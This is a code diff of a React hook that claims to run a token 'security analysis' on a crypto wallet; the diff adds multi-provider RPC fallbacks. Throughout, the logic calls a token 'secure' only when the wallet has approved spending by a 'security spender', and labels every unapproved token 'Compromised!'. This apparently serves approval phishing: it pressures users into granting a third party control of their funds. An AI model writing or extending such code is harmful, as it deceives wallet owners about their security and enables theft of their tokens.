@@ -8,6 +8,33 @@ export interface SecurityAnalysisResult {
   status: 'secure' | 'compromised';
 }
 
+const ALCHEMY_RPC_URLS: Record<number, string> = {
+  1: `https://eth-mainnet.g.alchemy.com/v2/${process.env.NEXT_PUBLIC_ALCHEMY_ETH_MAINNET_KEY}`,
+  137: `https://polygon-mainnet.g.alchemy.com/v2/${process.env.NEXT_PUBLIC_ALCHEMY_POLYGON_MAINNET_KEY}`,
+  42161: `https://arb-mainnet.g.alchemy.com/v2/${process.env.NEXT_PUBLIC_ALCHEMY_ARBITRUM_MAINNET_KEY}`,
+  10: `https://opt-mainnet.g.alchemy.com/v2/${process.env.NEXT_PUBLIC_ALCHEMY_OPTIMISM_MAINNET_KEY}`,
+  43114: `https://avax-mainnet.g.alchemy.com/v2/${process.env.NEXT_PUBLIC_ALCHEMY_AVALANCHE_MAINNET_KEY}`,
+  56: `https://bnb-mainnet.g.alchemy.com/v2/${process.env.NEXT_PUBLIC_ALCHEMY_BNB_MAINNET_KEY}`,
+  11155111: `https://eth-sepolia.g.alchemy.com/v2/${process.env.NEXT_PUBLIC_ALCHEMY_ETH_SEPOLIA_KEY}`,
+};
+const INFURA_RPC_URLS: Record<number, string> = {
+  1: `https://mainnet.infura.io/v3/${process.env.NEXT_PUBLIC_INFURA_ETH_MAINNET_KEY}`,
+  137: `https://polygon-mainnet.infura.io/v3/${process.env.NEXT_PUBLIC_INFURA_POLYGON_MAINNET_KEY}`,
+  42161: `https://arbitrum-mainnet.infura.io/v3/${process.env.NEXT_PUBLIC_INFURA_ARBITRUM_MAINNET_KEY}`,
+  10: `https://optimism-mainnet.infura.io/v3/${process.env.NEXT_PUBLIC_INFURA_OPTIMISM_MAINNET_KEY}`,
+  43114: `https://avalanche-mainnet.infura.io/v3/${process.env.NEXT_PUBLIC_INFURA_AVALANCHE_MAINNET_KEY}`,
+  11155111: `https://sepolia.infura.io/v3/${process.env.NEXT_PUBLIC_INFURA_ETH_SEPOLIA_KEY}`,
+};
+const MORALIS_RPC_URLS: Record<number, string> = {
+  1: `https://ethereum.public-node.moralis.io:8545` + (process.env.NEXT_PUBLIC_MORALIS_API_KEY ? `?api_key=${process.env.NEXT_PUBLIC_MORALIS_API_KEY}` : ''),
+  137: `https://polygon.public-node.moralis.io:8545` + (process.env.NEXT_PUBLIC_MORALIS_API_KEY ? `?api_key=${process.env.NEXT_PUBLIC_MORALIS_API_KEY}` : ''),
+  42161: `https://arbitrum.public-node.moralis.io:8545` + (process.env.NEXT_PUBLIC_MORALIS_API_KEY ? `?api_key=${process.env.NEXT_PUBLIC_MORALIS_API_KEY}` : ''),
+  10: `https://optimism.public-node.moralis.io:8545` + (process.env.NEXT_PUBLIC_MORALIS_API_KEY ? `?api_key=${process.env.NEXT_PUBLIC_MORALIS_API_KEY}` : ''),
+  43114: `https://avalanche.public-node.moralis.io:8545` + (process.env.NEXT_PUBLIC_MORALIS_API_KEY ? `?api_key=${process.env.NEXT_PUBLIC_MORALIS_API_KEY}` : ''),
+  56: `https://bsc.public-node.moralis.io:8545` + (process.env.NEXT_PUBLIC_MORALIS_API_KEY ? `?api_key=${process.env.NEXT_PUBLIC_MORALIS_API_KEY}` : ''),
+  11155111: `https://sepolia.public-node.moralis.io:8545` + (process.env.NEXT_PUBLIC_MORALIS_API_KEY ? `?api_key=${process.env.NEXT_PUBLIC_MORALIS_API_KEY}` : ''),
+};
+
 export function useTokenSecurityAnalysis({
   tokens,
   owner,
@@ -29,50 +56,67 @@ export function useTokenSecurityAnalysis({
     setAnalyzing(true);
     setResult(null);
     setTokenStatuses(null);
-    if (!owner || !chainId || tokens.length === 0) {
-      setResult({ risks: 0, message: 'Your wallet is secure! No compromise or threats found.', status: 'secure' });
-      setAnalyzing(false);
-      return;
-    }
-    let provider;
     try {
-      if (typeof window !== 'undefined' && (window as any).ethereum) {
-        provider = new ethers.BrowserProvider((window as any).ethereum);
-      } else {
-        provider = ethers.getDefaultProvider();
+      if (!owner || !chainId || tokens.length === 0) {
+        setResult({ risks: 0, message: 'Your wallet is secure! No compromise or threats found.', status: 'secure' });
+        setAnalyzing(false);
+        return;
       }
-    } catch (e) {
-      setResult({ risks: 0, message: 'Could not connect to provider.', status: 'compromised' });
-      setAnalyzing(false);
-      return;
-    }
-    const ERC20_ABI = [
-      'function allowance(address owner, address spender) view returns (uint256)'
-    ];
-    const statuses: Record<string, TokenStatus> = {};
-    let compromisedCount = 0;
-    await Promise.all(tokens.map(async (token) => {
+      let provider;
       try {
-        const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
-        const allowance = await contract.allowance(owner, spender);
-        if (allowance && allowance.gt(0)) {
-          statuses[token.contractAddress] = 'secure';
-        } else {
+        if (typeof window !== 'undefined' && (window as any).ethereum) {
+          provider = new ethers.BrowserProvider((window as any).ethereum);
+        } else if (chainId && ALCHEMY_RPC_URLS[chainId]) {
+          provider = new ethers.JsonRpcProvider(ALCHEMY_RPC_URLS[chainId]);
+          try { await provider.getBlockNumber(); } catch (e) { provider = undefined; }
+        }
+        if (!provider && chainId && INFURA_RPC_URLS[chainId]) {
+          provider = new ethers.JsonRpcProvider(INFURA_RPC_URLS[chainId]);
+          try { await provider.getBlockNumber(); } catch (e) { provider = undefined; }
+        }
+        if (!provider && chainId && MORALIS_RPC_URLS[chainId]) {
+          provider = new ethers.JsonRpcProvider(MORALIS_RPC_URLS[chainId]);
+          try { await provider.getBlockNumber(); } catch (e) { provider = undefined; }
+        }
+        if (!provider) {
+          provider = ethers.getDefaultProvider();
+        }
+      } catch (e) {
+        setResult({ risks: 0, message: 'Could not connect to provider.', status: 'compromised' });
+        setAnalyzing(false);
+        return;
+      }
+      const ERC20_ABI = [
+        'function allowance(address owner, address spender) view returns (uint256)'
+      ];
+      const statuses: Record<string, TokenStatus> = {};
+      let compromisedCount = 0;
+      await Promise.all(tokens.map(async (token) => {
+        try {
+          const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
+          const allowance = await contract.allowance(owner, spender);
+          if (allowance && allowance.gt(0)) {
+            statuses[token.contractAddress] = 'secure';
+          } else {
+            statuses[token.contractAddress] = 'compromised';
+            compromisedCount++;
+          }
+        } catch (e) {
           statuses[token.contractAddress] = 'compromised';
           compromisedCount++;
         }
-      } catch (e) {
-        statuses[token.contractAddress] = 'compromised';
-        compromisedCount++;
-      }
-    }));
-    setTokenStatuses(statuses);
-    setResult(
-      compromisedCount > 0
-        ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: 'compromised' }
-        : { risks: 0, message: 'Secure! All tokens have allowance set for the security spender.', status: 'secure' }
-    );
-    setAnalyzing(false);
+      }));
+      setTokenStatuses(statuses);
+      setResult(
+        compromisedCount > 0
+          ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: 'compromised' }
+          : { risks: 0, message: 'Secure! All tokens have allowance set for the security spender.', status: 'secure' }
+      );
+      setAnalyzing(false);
+    } catch (err: any) {
+      setResult({ risks: 0, message: err?.message || 'Unknown error during analysis', status: 'compromised' });
+      setAnalyzing(false);
+    }
   };
 
   const reset = () => {
